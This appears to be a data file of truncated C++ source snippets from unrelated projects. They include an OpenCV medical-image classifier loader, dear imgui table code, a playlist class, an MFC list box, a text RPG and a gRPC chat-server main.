    "#include \"dcmtk/dcmdata/dctk.h\" // Include DCMTK headers\n#include <opencv2/opencv.hpp>\n#include <opencv2/core.hpp>\n#include <opencv2/imgcodecs.hpp>\n#include <opencv2/highgui.hpp>\n\n#include <filesystem>\n#include <unordered_map>\n#include <random>\n#include <opencv2/ml.hpp>\n#include <fstream>\n#include <sstream>\n#include <thread>\n#include <future>\n#include <chrono>\n#include \"EnumClass.h\"\n#include \"Image.h\"\n#include \"Classifier.h\"\n#include \"Globals.h\"\n\n#include <cstdlib> // For system()\n\nnamespace fs = std::filesystem;\n\n// Function to build a map containing test data image name and its classID from train_classification.csv\nvoid build_data_class_ID_map(const std::string& filePath) {\n    std::cout << \"\\nBuilding Test Data Classication Map...\\n\";\n    std::ifstream file(filePath);\n    if (!file.is_open()) {\n        std::cerr << \"Failed to open file: \" << filePath << std::endl;\n        return;\n    }\n\n    std::string line;\n    // Skip header\n    std::getline(file, line);\n    int count = 0;\n    while (std::getline(file, line)) {\n        std::stringstream ss(line);\n        std::string fileName, classID_str;\n\n        if (std::getline(ss, fileName, ',') && std::getline(ss, classID_str, ','))\n        {\n            // Create a stringstream for the classID string to parse multiple IDs\n            std::stringstream classID_stream(classID_str);\n            std::string id;\n            std::vector<int> ids;\n\n            // Parse multiple IDs separated by some delimiter (assuming space)\n            // Modify the delimiter based on your data format\n            while (std::getline(classID_stream, id, ' ')) {\n                try {\n                    ids.push_back(std::stoi(id));\n                }\n                catch (const std::exception& e) {\n                    std::cerr << \"Error converting ID: \" << id << \" for file: \" << fileName << std::endl;\n                    continue;\n                }\n            }\n\n            classID_map[fileName] = ids;\n            count++;\n        }\n    }\n    std::cout << \"Building map completed.\\n\";\n    std::cout << \"Size: \" << classID_map.size() << std::endl;\n    std::cout << \"Example:\\n\";\n\n    count = 0;\n    for (const auto& entry : classID_map) {\n        std::cout << entry.first << \" : \";\n        for (size_t i = 0; i < entry.second.size(); ++i) {\n            std::cout << entry.second[i];\n            if (i < entry.second.size() - 1) {\n                std::cout << \", \";\n            }\n        }\n        std::cout << \"\\n\";\n        count++;\n        if (count >= 5) break;\n    }\n    file.close();\n}\n\n// Function to load the PNG images of body parts inside bodyparts-train-data directory\nvoid load_data(const std::string& data_dir,\n    std::vector<cv::Mat>& images,\n    std::vector<int>& labels) {\n\n    std::cout << \"\\nLoading training images and labels...\\n\";\n\n    // Convert to absolute path\n    fs::path dir_path = fs::absolute(fs::path(data_dir));\n    std::cout << \"\\nDirectory details:\" << std::endl;\n    std::cout << \"Input path: \" << data_dir << std::endl;\n    std::cout << \"Absolute path: \" << dir_path.string() << std::endl;\n    std::cout << \"Current working directory: \" << fs::current_path().string() << std::endl;\n\n    if (!fs::exists(dir_path)) {\n        std::cerr << \"Error: Directory does not exist: \" << dir_path.string() << std::endl;\n        return;\n    }\n\n    for (const auto& entry : fs::directory_iterator(dir_path)) {\n        if (entry.path().extension() == \".png\") {\n            fs::path fullPath = entry.path();\n            std::string fileName = entry.path().filename().string();\n            cv::Mat img;\n            img = cv::imread(fullPath.string(), cv::IMREAD_COLOR);\n            if (img.empty()) {\n                std::cerr << \"Warning: Could not open or find image: \" << entry.path() << std::endl;\n                continue; // Skip this image if it cannot be loaded;\n            }\n\n            // Check if the image has an entry in the classID map\n            auto mapIt = classID_map.find(fileName);\n            if (mapIt == classID_map.end()) {\n                std::cerr << \"Warning: No class ID found for image: \" << fileName << std::endl;\n                continue;\n            }\n\n            // For each label associated with this image, create a training sample\n            for (const int& label : mapIt->second) {\n                preprocess_image(img);\n                images.push_back(img.clone());  // Need to clone for separate instances\n                labels.push_back(label);\n            }\n        }\n    }\n\n    std::cout << \"Loading completed.\\n\";\n    std::cout << \"Data Rows: \" << images.size() << \", Labels Rows: \" << labels.size() << std::endl;\n}\n\n\n//// Preprocess image (resize and normalize if necessary)\nvoid preprocess_image(cv::Mat& img) {\n    // Convert to grayscale if it's a color image\n    if (img.channels() == 3) { // Check if the image has 3 channels (BGR)\n        cv::cvtColor(img, img, cv::COLOR_BGR2GRAY); // Convert to grayscale\n    }\n    else if (img.channels() != 1) { // If not grayscale ",
    "// dear imgui, v1.91.6 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from win",
    "#include <iostream>\n#include \"Graph.h\"\n#include \"BinarySearchTree.h\"\n#include \"Sorting.h\"\n\nusing namespace std;\n\nvoid menu_display() {\n    cout << \"Welcome to the Multi-Utility System!\"\n        <<\" Please choose an option from the main menu. :\\n\";\n    cout << \"1. Graph Pathfinding(the shortest path): \\n\";\n    cout << \"2. Binary Search Tree Operations: \\n\";\n    cout << \"3. Sorting Functions(Merge & Quick ):\\n\";\n    cout << \"4. Exit\\n\";\n}\n\nvoid menu_of_graph(Graph& graph) {\n    int graph_choice;\n    do {\n        cout << \"\\nGraph Menu:\\n\";\n        cout << \"1. Add edge between vertices\\n\";\n        cout << \"2. Dijkstra's algorithm\\n\";\n        cout << \"3. Back to main menu\\n\";\n        cout << \"Enter your choice: \";\n        while (!(cin >> graph_choice)) {\n            cout << \"Invalid input. Please enter an integer: \";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n        switch (graph_choice) {\n        case 1: {\n            int u, v, weight;\n            cout << \"Enter source, destination, and weight: \";\n            cin >> u >> v >> weight;\n            graph.addEdge(u, v, weight);\n            break;\n        }\n        case 2: {\n            int start, end;\n            cout << \"Enter start and end vertices: \";\n            cin >> start >> end;\n            graph.dijkstra(start, end);\n            break;\n        }\n        case 3:\n            cout << \"Returning to main menu...\\n\";\n            break;\n        default:\n            cout << \"Invalid choice, try again.\\n\";\n        }\n    } while (graph_choice != 3);\n}\n\nvoid menu_of_trees(BinarySearchTree& bst) {\n    int tree_choice;\n    do {\n        cout << \"\\nBST Menu:\\n\";\n        cout << \"1. Insert a node\\n\";\n        cout << \"2. Delete a node\\n\";\n        cout << \"3. Inorder Traversal\\n\";\n        cout << \"4. Preorder Traversal\\n\";\n        cout << \"5. Postorder Traversal\\n\";\n        cout << \"6. Back to main menu\\n\";\n        cout << \"Enter your choice: \";\n        while (!(cin >> tree_choice)) {\n            cout << \"Invalid input. Please enter an integer: \";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n\n        switch (tree_choice) {\n        case 1: {\n            int value;\n            cout << \"Enter value to insert: \";\n            while (!(cin >> value)) {\n                cout << \"Invalid input. Please enter an integer: \";\n                cin.clear();\n                cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            }\n            bst.insert(value);\n            break;\n        }\n        case 2: {\n            int value;\n            cout << \"Enter value to delete: \";\n            while (!(cin >> value)) {\n                cout << \"Invalid input. Please enter an integer: \";\n                cin.clear();\n                cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            }\n            bst.deleteNode(value);\n            break;\n        }\n        case 3:\n            cout << \"Inorder Traversal: \";\n            bst.InOrderTraversal();\n            break;\n        case 4:\n            cout << \"Preorder Traversal: \";\n            bst.PreOrderTraversal();\n            break;\n        case 5:\n            cout << \"Postorder Traversal: \";\n            bst.PostOrderTraversal();\n            break;\n        case 6:\n            cout << \"Returning to main menu...\\n\";\n            break;\n        default:\n            cout << \"Invalid choice, try again.\\n\";\n        }\n    } while (tree_choice != 6);\n}\n\nvoid menu_of_sorting() {\n    int sorting_choice;\n    do {\n        cout << \"\\nSorting Menu:\\n\";\n        cout << \"1. Sort array using Merge Sort\\n\";\n        cout << \"2. Sort array using Quick Sort\\n\";\n        cout << \"3. Back to main menu\\n\";\n        cout << \"Enter your choice: \";\n        while (!(cin >> sorting_choice)) {\n            cout << \"Invalid input. Please enter an integer: \";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n\n        switch (sorting_choice) {\n        case 1: {\n            int size;\n            cout << \"Enter size of array: \";\n            while (!(cin >> size) || size <= 0) {\n                cout << \"Invalid input. Please enter a positive integer: \";\n                cin.clear();\n                cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n            }\n\n            int* arr = new int[size];\n            cout << \"Enter array elements: \";\n            for (int i = 0; i < size; ++i) cin >> arr[i];\n\n            int comparisons = 0, swaps = 0;\n            Sorting sorter;\n            sorter.mergeSort(arr, 0, size - 1, comparisons, swaps);\n\n            cout << \"Sorted array: \";\n            for (int i = 0; i < size; ++i) cout << arr[i] << \" \";\n            cout << \"\\nComparisons: \" << comparisons << \", Swaps: \" << swaps << \"\\n\";\n\n            delete[] arr;\n            break;\n        }\n        case 2: {\n            int size;\n            cout << \"Enter size of array: \";\n            while (!(cin >> size) || size <= 0) {",
    "#include \"Playlist.h\"\n#include <iostream>\n\nPlaylist::Playlist() : isPlaying(false), isPaused(false), currentDuration(0), stopFlag(false), songFinished(false) {}\n\nvoid Playlist::add(const Song& song) {\n    songs.push_back(song);\n}\n\nvoid Playlist::insert(int index, const Song& song) {\n    songs.insert(songs.begin() + index, song);\n}\n\nvoid Playlist::remove(int index) {\n    songs.erase(songs.begin() + index);\n}\n\nvoid Playlist::play() {\n    if (songs.empty()) {\n        std::cout << \"No songs in the playlist.\\n\";\n        return;\n    }\n    if (isPlaying && !isPaused) {\n        std::cout << \"Already playing. Use next/previous to navigate.\\n\";\n        return;\n    }\n    std::cout << \"Starting to play...\\n\";\n    isPlaying = true;\n    isPaused = false;\n    stopFlag = false;\n    songFinished = false;\n    if (playbackThread.joinable()) {\n        playbackThread.join();\n    }\n    playbackThread = std::thread(&Playlist::playback, this);\n}\n\nvoid Playlist::pause() {\n    if (!isPlaying || isPaused) {\n        std::cout << \"No song is currently playing or already paused.\\n\";\n        return;\n    }\n    std::cout << \"Pausing the current song.\\n\";\n    isPaused = true;\n    stopFlag = true;\n    if (playbackThread.joinable()) {\n        playbackThread.join();\n    }\n    stopTimer();\n}\n\nvoid Playlist::next() {\n    if (songs.empty() || songs.size() < 2) {\n        std::cout << \"No next songs in the playlist.\\n\";\n        return;\n    }\n    if (isPlaying) {\n        stopFlag = true;\n        if (playbackThread.joinable()) {\n            playbackThread.join();\n        }\n    }\n    songs.pop_front();\n    if (songs.empty()) {\n        std::cout << \"No more songs in the playlist.\\n\";\n        isPlaying = false;\n        isPaused = false;\n        return;\n    }\n    isPlaying = true;\n    clearTimer();\n    play();\n}\n\nvoid Playlist::clear() {\n    if (isPlaying) {\n        stopFlag = true;\n        if (playbackThread.joinable()) {\n            playbackThread.join();\n        }\n    }\n    songs.clear();\n    isPlaying = false;\n    isPaused = false;\n}\n\nvoid Playlist::display() const {\n    if (songs.empty()) {\n        std::cout << \"No songs in the playlist.\\n\";\n\t\treturn;\n    }\n\n    std::cout << \"Current Song:\" << std::endl;\n    songs.front().displayInfo();\n\n    std::cout << \"Playlist:\" << std::endl;\n    for (size_t i = 0; i < songs.size(); i++) {\n        std::cout << i + 1 << \". \";\n        songs[i].displayInfo();\n    }\n}\n\nvoid Playlist::startTimer() {\n    if (!isPlaying || isPaused || songs.empty()) {\n        return;\n    }\n    startTime = std::chrono::steady_clock::now();\n}\n\nvoid Playlist::stopTimer() {\n    auto now = std::chrono::steady_clock::now();\n    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();\n    currentDuration += static_cast<int>(elapsed);\n    std::cout << \"Song paused at \" << currentDuration << \" seconds.\\n\";\n}\n\nvoid Playlist::clearTimer() {\n    currentDuration = 0;\n}\n\nvoid Playlist::playback() {\n    int duration = songs.front().getDuration();\n    startTimer();\n    for (int i = currentDuration; i < duration; ++i) {\n        if (stopFlag) {\n            break;\n        }\n        std::this_thread::sleep_for(std::chrono::seconds(1)); // Simulate 1 second passing\n        std::cout << \"Time left: \" << duration - (i + 1) << \" seconds...\\r\";\n    }\n    if (!stopFlag) {\n        std::cout << \"\\nSong finished.\\n\";\n        songFinished = true;\n    }\n}\n\nbool Playlist::isSongFinished() const {\n    return songFinished;\n}\n\nvoid Playlist::resetSongFinished() {\n    songFinished = false;\n}\n",
    "// ListBox.cpp : implementation file\n//\n\n#include \"stdafx.h\"\n#include \"PlaylistBox.h\"\n#include \"ListBox.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#undef THIS_FILE\nstatic char THIS_FILE[] = __FILE__;\n#endif\n\n/////////////////////////////////////////////////////////////////////////////\n// ListBox\n\nListBox::ListBox()\n{\n}\n\nListBox::~ListBox()\n{\n}\n\n\nBEGIN_MESSAGE_MAP(ListBox, CListBox)\n\t//{{AFX_MSG_MAP(ListBox)\n\t\t// NOTE - the ClassWizard will add and remove mapping macros here.\n\t//}}AFX_MSG_MAP\nEND_MESSAGE_MAP()\n\n/////////////////////////////////////////////////////////////////////////////\n// ListBox message handlers\n\nvoid ListBox::MeasureItem(LPMEASUREITEMSTRUCT lpMeasureItemStruct) \n{\n\t// TODO: Add your code to determine the size of specified item\n\tlpMeasureItemStruct->itemHeight = 52;\n\t\n}\n\nvoid ListBox::DrawItem(LPDRAWITEMSTRUCT lpDrawItemStruct) \n{\n\t// TODO: Add your code to draw the specified item\n\tCDC* dc = CDC::FromHandle(lpDrawItemStruct->hDC);\n\t\n\n\tif ((int)lpDrawItemStruct->itemID < 0)\n\t{\n\t\t// If there are no elements in the List Box \n\t\t// based on whether the list box has Focus or not \n\t\t// draw the Focus Rect or Erase it,\n\t\tif ((lpDrawItemStruct->itemAction & ODA_FOCUS) && (lpDrawItemStruct->itemState & ODS_FOCUS))\n\t\t{\n\t\t\tdc->DrawFocusRect(&lpDrawItemStruct->rcItem);\n\t\t}\n\t\telse if ((lpDrawItemStruct->itemAction & ODA_FOCUS) && !(lpDrawItemStruct->itemState & ODS_FOCUS)) \n\t\t{\n\t\t\tdc->DrawFocusRect(&lpDrawItemStruct->rcItem); \n\t\t}\n\t\treturn;\n\t}// end if\n\n\t// String to store the text, which will be added to the CListBox\n\tCString strText;\n\t\n\t// Get the item text.\n\tGetText(lpDrawItemStruct->itemID, strText);\n\t\n\t\tCString strTrackID;\n\t\tstrTrackID.Format( \"[ %d ] \", lpDrawItemStruct->itemID );\n\t\t// add trackID to text\n\t\tstrText.Insert( 0, strTrackID );\n\n\t// check if list box has support tab character\n\t// then add style to nFormat (text style)\n\tUINT nFormat = DT_LEFT | DT_SINGLELINE | DT_VCENTER;\n\tif (GetStyle() & LBS_USETABSTOPS)\n\t\tnFormat |= DT_EXPANDTABS;\n\t\n\tCRect rItem = lpDrawItemStruct->rcItem;\n\n\n\t// If item selected, draw the highlight rectangle.\n\t// Or if item deselected, draw the rectangle using the window color.\n\tif (\t(lpDrawItemStruct->itemState & ODS_SELECTED) && \n\t\t\t(lpDrawItemStruct->itemAction & (ODA_SELECT | ODA_DRAWENTIRE)))\n\t{\n\t\t//CBrush br(::GetSysColor(COLOR_HIGHLIGHT));\n\t\tCBrush br( RGB( 255, 107, 107 ) );\n\t\tdc->FillRect(&rItem, &br);\n\t}\n\telse if (!(lpDrawItemStruct->itemState & ODS_SELECTED) && \n\t\t(lpDrawItemStruct->itemAction & ODA_SELECT)) \n\t{\n\t\tCBrush br(::GetSysColor(COLOR_WINDOW));\n\t\tdc->FillRect(&rItem, &br);\n\t}\n\t\n\t// If the item has focus, draw the focus rect.\n\t// If the item does not have focus, erase the focus rect.\n\tif ((lpDrawItemStruct->itemAction & ODA_FOCUS) && (lpDrawItemStruct->itemState & ODS_FOCUS))\n\t{\n\t\tdc->DrawFocusRect(&rItem); \n\t}\n\telse if ((lpDrawItemStruct->itemAction & ODA_FOCUS) && !(lpDrawItemStruct->itemState & ODS_FOCUS))\n\t{\n\t\tdc->DrawFocusRect(&rItem); \n\t}\n\t\n\t// To draw the Text set the background mode to Transparent.\n\tint iBkMode = dc->SetBkMode(TRANSPARENT);\n\t\n\tCOLORREF crText;\n\t\n\tif (lpDrawItemStruct->itemState & ODS_SELECTED)\n\t\tcrText = dc->SetTextColor(::GetSysColor(COLOR_HIGHLIGHTTEXT));\n\telse if (lpDrawItemStruct->itemState & ODS_DISABLED)\n\t\tcrText = dc->SetTextColor(::GetSysColor(COLOR_GRAYTEXT));\n\telse\n\t\tcrText = dc->SetTextColor(::GetSysColor(COLOR_WINDOWTEXT));\n\n\t\n\tCFont font;\n\tfont.CreatePointFont(110,\"Lucida Sans Unicode\");\n\t\n\tdc->SelectObject( font );\n\tdc->DrawText( strText, rItem, nFormat );\n\t\n\tdc->SetTextColor(crText);\n\tfont.DeleteObject();\n\n}// end DrawItem\n\n",
    "/*\nBoost Software License - Version 1.0 - August 17th, 2003\n\nPermission is hereby granted, free of charge, to any person or organization\nobtaining a copy of the software and accompanying documentation covered by\nthis license (the \"Software\") to use, reproduce, display, distribute,\nexecute, and transmit the Software, and to prepare derivative works of the\nSoftware, and to permit third-parties to whom the Software is furnished to\ndo so, all subject to the following:\n\nThe copyright notices in the Software and this entire statement, including\nthe above license grant, this restriction and the following disclaimer,\nmust be included in all copies of the Software, in whole or in part, and\nall derivative works of the Software, unless such copies or derivative\nworks are solely in the form of machine-executable object code generated by\na source language processor.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE, TITLE AND NON-INFRINGEMENT. IN NO EVENT\nSHALL THE COPYRIGHT HOLDERS OR ANYONE DISTRIBUTING THE SOFTWARE BE LIABLE\nFOR ANY DAMAGES OR OTHER LIABILITY, WHETHER IN CONTRACT, TORT OR OTHERWISE,\nARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\nDEALINGS IN THE SOFTWARE.\n*/\n\n#define LDL_IMPLEMENTATION\n#include <LDL/LDL.hpp>\n#include <stdio.h>\n\nint main()\n{\n\tLDL_Result result;\n\n\tLDL_Window window(&result, LDL_Vec2i(0, 0), LDL_Vec2i(800, 600), \"05Img\");\n\tLDL_Render render(&window);\n\n\tLDL_FpsCounter fpsCounter;\n\tLDL_Converter  convert;\n\n\tLDL_BmpLoader bmp(&result);\n\tbmp.Load(\"img24.bmp\");\n\n\tif (result.Ok())\n\t{\n\t\tLDL_Texture texture(bmp.Size(), bmp.Pixels(), bmp.Bpp());\n\n\t\trender.SetColor(LDL_Color(0, 162, 232));\n\n\t\tLDL_Event report;\n\n\t\twhile (window.Running())\n\t\t{\n\t\t\tfpsCounter.Start();\n\n\t\t\twhile (window.GetEvent(report))\n\t\t\t{\n\t\t\t\tif (report.Type == LDL_Event::IsQuit)\n\t\t\t\t{\n\t\t\t\t\twindow.StopEvent();\n\t\t\t\t}\n\t\t\t}\n\n\t\t\trender.Begin();\n\n\t\t\trender.SetColor(LDL_Color(0, 162, 232));\n\t\t\trender.Clear();\n\n\t\t\trender.Draw(&texture, LDL_Vec2i(15, 30));\n\n\t\t\trender.End();\n\n\t\t\tif (fpsCounter.Calc())\n\t\t\t{\n\t\t\t\twindow.Title(convert.Convert(fpsCounter.Fps()));\n\t\t\t\tfpsCounter.Clear();\n\t\t\t}\n\n\t\t\twindow.PollEvents();\n\t\t}\n\t}\n\telse\n\t{\n\t\tprintf(\"%s\\n\", result.Message());\n\t}\n\n\treturn 0;\n}\n",
    "// EE1010 Final Project | The Elemental Surge, by Henry Li\r\n// Language: C++ 20\r\n// Libraries\r\n#include <iostream>\r\n#include <string>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <windows.h>\r\nusing namespace std;\r\n\r\n// Version\r\nstring version = \"2025v5_0112\";\r\n\r\n// Functions Declaration\r\nvoid Home();\r\nvoid Instructions();\r\nint BasicLevel();\r\nvoid PvPMode();\r\nvoid Again();\r\n\r\n// Main Function\r\nint main() {\r\n    // Welcome message\r\n    cout << \"\\nWelcome to The Elemental Surge -A Text-Based Tactical Role-Playing Game by Henry Li-\" << endl;\r\n    Home();\r\n\r\n    return 0;\r\n}\r\n\r\n// Home Menu\r\nvoid Home() {\r\n    cout << \"\\n------ Home ------ \\n\";\r\n    cout << \" 1. Start New Game \\n 2. Instructions \\n 3. Quit Game \\n\";\r\n    cout << \"Select option: \";\r\n    int startInput;\r\n    cin >> startInput;\r\n\r\n    // Game Mode Selection\r\n    if (startInput == 1) {\r\n        cout << \"\\n--- Game Modes --- \\n\";\r\n        cout << \" a. Single Player \\n b. 2 Players PvP \\n c. Return to Home \\n\";\r\n        cout << \"Select Game Mode: \";\r\n        char modeInput;\r\n        cin >> modeInput;\r\n\r\n        // A - Single Player (Basic Level) Mode\r\n        if (modeInput == 'A') {\r\n            BasicLevel();\r\n        }\r\n        else if (modeInput == 'a') {\r\n            BasicLevel();\r\n        }\r\n\r\n        // B - 2 Players PvP Mode\r\n        else if (modeInput == 'B') {\r\n            PvPMode();\r\n        }\r\n        else if (modeInput == 'b') {\r\n            PvPMode();\r\n        }\r\n\r\n        // C - Return to Home Menu\r\n        else if (modeInput == 'C') {\r\n            Home();\r\n        }\r\n        else if (modeInput == 'c') {\r\n            Home();\r\n        }\r\n\r\n        // Error message, return to home\r\n        else {\r\n            cout << \"\\nSyntax Error. Returning to Home Menu... \\n \\n\" << endl;\r\n            Sleep(500);\r\n            Home();\r\n        }\r\n    }\r\n\r\n    // Direct to instructions\r\n    else if (startInput == 2) {\r\n        Instructions();\r\n    }\r\n\r\n    // Exit Game\r\n    else if (startInput == 3) {\r\n        cout << \"\\nThank you for playing The Elemental Surge. \\n \\nVersion: \" << version << \" \\n(c)2025 Royal Holloway, University of London.\\n\";\r\n        Sleep(2500);\r\n        exit(0);\r\n    }\r\n\r\n    // Error Message, return to home\r\n    else {\r\n        cout << \"\\nSyntax Error. Returning to Home Menu... \\n\" << endl;\r\n        Sleep(500);\r\n        Home();\r\n    }\r\n}\r\n\r\n// Instructions\r\nvoid Instructions() {\r\n    cout << \"\\nLoading Instructions... \\n\";\r\n    Sleep(500);\r\n\r\n    cout << \"\\n----- Instructions ----- \\n\";\r\n    cout << \"This game follows a regular turn-based role-playing game (RPG) structure. \\n\";\r\n\r\n    Sleep(1500);\r\n\r\n    cout << \"\\nThe Single Player mode consists of 3 stages.\\n\";\r\n    cout << \"The game will be initialised with a default health of 1000 HP, 3 attack skills, and a Power Shield. \\nThe attack skills are as following: \\n\";\r\n    cout << \"   A.\tFire Punch       (Attack),  Opponent \u2013100 HP \\n\";\r\n    cout << \"   B.\tVoltage Blast    (Attack),  Opponent \u2013200 HP \\n\";\r\n    cout << \"   C.\tPower Shield     (Defend),  Player   +500 HP [3 Uses] \\n\";\r\n    cout << \"   D.\tMysterious Sonar (Attack),  Opponent \u2013500 HP [1 Use] \\n\";\r\n\r\n    Sleep(5000);\r\n\r\n    cout << \"\\nThe 2 Players Player-vs-Player (PvP) mode will initialise both players with a default health of 1500 HP, 3 attack skills, and a Power Shield. \\nThe attack skills are as following: \\n\";\r\n    cout << \"   A.\tAqua Burst         (Attack),  Opponent \u2013200 HP \\n\";\r\n    cout << \"   B.\tGolden Blast       (Attack),  Opponent \u2013400 HP \\n\";\r\n    cout << \"   C.\tPower Shield       (Defend),  Player   +300 HP [3 Uses] \\n\";\r\n    cout << \"   D.\tQuantum Demolisher (Attack),  Opponent \u2013800 HP [1 Use] \\n\";\r\n\r\n    cout << \"\\n * Please note that the Power Shield will never recover you to maximum health * \\n\";\r\n\r\n    Sleep(5000);\r\n\r\n    char returnInput;\r\n    cout << \"\\nPlease press any character and 'Enter' to return to main menu. \";\r\n    cin >> returnInput;\r\n\r\n    if (returnInput == 'R') {\r\n        Home();\r\n    }\r\n    else {\r\n        Home();\r\n    }\r\n}\r\n\r\n// Single Player (Basic Level) Mode\r\nint BasicLevel() {\r\n    string playerName;\r\n\r\n    cout << \"\\nYou are now entering the Single Player Mode... \\n\";\r\n    Sleep(500);\r\n\r\n    cout << \"\\n Enter Player Name: \";\r\n    cin >> playerName;\r\n\r\n    // Declaring HP and skills variables\r\n    int playerHP = 1000;\r\n    const int firePunch = 100;\r\n    const int voltageBlast = 200;\r\n    const int powerShield = 500;\r\n    const int mysteriousSonar = 500;\r\n    bool sonarUsed = false;\r\n    int shieldCounter = 3;\r\n\r\n    // Setting a random counter\r\n    srand(static_cast<unsigned>(time(0)));\r\n\r\n    // Setting up stage number and NPC opponent's name and HP\r\n    for (int stage = 1; stage <= 3; ++stage) {\r\n        string opponent;\r\n        int opponentHP = 0;\r\n        if (stage == 1) {\r\n            opponent = \"Goblin\";\r\n            opponentHP = 200;\r\n        }\r\n        else if (stage == 2) {\r\n            opponent = \"Giant\";\r\n            opponentHP = 500;\r\n        }\r\n        else if (st",
    "\ufeff#include \"LogicSystem.h\"\n#include <csignal>\n#include <thread>\n#include <mutex>\n#include \"AsioIOServicePool.h\"\n#include \"CServer.h\"\n#include \"ConfigMgr.h\"\n#include <iostream>\n#include \"RedisMgr.h\"\n#include \"const.h\"\n#include \"ChatServiceImpl.h\"\n\nbool bstop = false;\nstd::condition_variable cond_quit;\nstd::mutex mutex_quit;\nint main()\n{\n\n\tauto& cfg = ConfigMgr::Inst();\n\tauto server_name = cfg[\"SelfServer\"][\"Name\"];\n\ttry {\n\t\tauto& cfg = ConfigMgr::Inst();\n\t\tauto pool = AsioIOServicePool::GetInstance();\n\n\t\t//\u5c06\u767b\u5f55\u6570\u8bbe\u7f6e\u4e3a0\u5e76\u540c\u6b65\u5230redis\n\t\tRedisMgr::GetInstance()->HSet(LOGIN_COUNT, server_name, \"0\");\n\t\t//\u5b9a\u4e49\u4e00\u4e2aGrpcServer\n\t\tstd::string server_address(cfg[\"SelfServer\"][\"Host\"] + \":\" + cfg[\"SelfServer\"][\"RPCPort\"]);\n\t\tChatServiceImpl service;\n\t\tgrpc::ServerBuilder builder;\n\t\t//\u76d1\u542c\u7aef\u53e3\u548c\u6dfb\u52a0\u670d\u52a1\n\t\tbuilder.AddListeningPort(server_address, grpc::InsecureServerCredentials());\n\t\tbuilder.RegisterService(&service);\n\n\t\t//\u6784\u5efa\u548c\u542f\u52a8grpc\u670d\u52a1\u5668\n\t\tstd::unique_ptr<grpc::Server> server(builder.BuildAndStart());\n\t\tstd::cout << \"RPC Server listening on \" << server_address << std::endl;\n\t\t\n\t\t//\u5355\u72ec\u542f\u52a8\u4e00\u4e2a\u7ebf\u7a0b\u5904\u7406grpc\u670d\u52a1\n\t\tstd::thread  